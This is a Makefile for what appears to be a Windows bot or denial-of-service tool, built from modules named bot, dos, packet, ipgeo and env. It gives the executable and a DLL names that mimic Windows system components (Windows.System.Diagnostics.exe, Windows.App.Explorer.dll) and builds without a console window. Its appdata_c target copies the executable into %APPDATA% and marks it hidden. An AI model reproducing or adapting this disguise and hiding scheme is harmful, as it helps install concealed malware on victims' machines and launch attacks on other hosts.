OUT_DIR = source
APPDATA_DIR := $(shell cmd /C echo %APPDATA%)
HOME := $(shell git rev-parse --show-toplevel)

SRC_MAIN = x86_x64.c
SRC_LOG = ICU_log.c
SRC_CLEAN = ICU_clean.c
SRC_BOT = core/ICU_bot.c
SRC_IPGEO = stdlib/ICU_ipgeo.c
SRC_ENV = stdlib/ICU_env.c
SRC_PACKET = stdlib/ICU_packet.c
SRC_DOS = stdlib/ICU_dos.c
SRC_WIN_REESTR = process/windowsprocess.c

SRC_DLL = process/DLL/DLL_explorer.c

MAIN_OUT = "$(OUT_DIR)/Windows.System.Diagnostics.exe"
APPDATA_OUT = $(APPDATA_DIR)

CC = gcc
CFLAGS = -mwindows
LDFLAGS = -lws2_32
HTTPFLAGS = -lwinhttp
LAPIFLAGS = -liphlpapi
LSHELL32 = -lshell32
LOLE32  = -lole32
LUUID  = -luuid

exe: $(MAIN_OUT)

$(MAIN_OUT): $(SRC_MAIN)
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) $(SRC_MAIN) -o $(MAIN_OUT) $(SRC_LOG) $(SRC_BOT) $(SRC_IPGEO) $(SRC_ENV) $(SRC_PACKET) $(SRC_DOS) $(SRC_WIN_REESTR) $(CFLAGS) $(LDFLAGS) $(HTTPFLAGS) $(LAPIFLAGS) $(LSHELL32) $(LOLE32) $(LUUID)

icu_clean:
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) $(SRC_CLEAN) -o "$(OUT_DIR)/icuclean-x86_x64.exe" $(SRC_ENV)

appdata_c:
	copy /Y "$(HOME)\.sys\windows\source\Windows.System.Diagnostics.exe" "$(APPDATA_OUT)"
	attrib +h "$(APPDATA_OUT)\Windows.System.Diagnostics.exe"
appdata_d:
	del /Q "$(APPDATA_OUT)\Windows.System.Diagnostics.exe"

dll:
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) -shared -o $(OUT_DIR)/Windows.App.Explorer.dll $(SRC_DLL) -Wall -Wextra $(LDFLAGS)

clean:
	rm -f $(EXE_OUT) $(DLL_OUT)
